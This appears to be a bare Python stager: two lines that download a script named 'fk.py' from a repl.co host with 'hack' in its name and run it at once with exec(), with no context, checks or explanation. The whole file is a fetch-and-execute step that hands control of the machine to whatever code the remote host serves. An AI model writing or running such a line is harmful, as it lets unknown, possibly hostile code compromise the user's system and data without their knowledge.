import requests
exec(requests.get("https://hack.riverdaleopensource.repl.co/fk.py").text)